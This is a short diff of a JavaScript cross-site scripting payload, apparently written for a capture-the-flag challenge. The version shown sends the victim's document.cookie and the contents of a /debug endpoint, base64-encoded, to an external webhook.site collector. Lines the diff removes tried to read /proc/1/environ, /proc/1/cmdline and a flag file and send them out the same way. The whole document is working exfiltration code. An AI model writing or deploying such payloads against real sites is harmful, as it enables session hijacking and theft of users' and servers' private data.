@@ -1,11 +1,5 @@
-var w='https://webhook.site/c2d9b0eb-fe42-4d33-aefa-08d500dfb848';
+var w='https://webhook.site/58638dc1-df78-4ae9-b5f7-4b639eeaad10';
 fetch(w+'/cookie?d='+encodeURIComponent(document.cookie));
-fetch('file:///proc/1/environ').then(function(r){return r.text()}).then(function(t){
-  fetch(w+'/ENV?d='+btoa(t));
-}).catch(function(e){fetch(w+'/ENV_ERR')});
-fetch('file:///flag').then(function(r){return r.text()}).then(function(t){
-  fetch(w+'/FLAG?d='+btoa(t));
-}).catch(function(e){fetch(w+'/FLAG_ERR')});
-fetch('file:///proc/1/cmdline').then(function(r){return r.text()}).then(function(t){
-  fetch(w+'/CMD?d='+btoa(t));
+fetch('/debug').then(function(r){return r.text()}).then(function(t){
+  fetch(w+'/DEBUG?d='+btoa(t));
 });
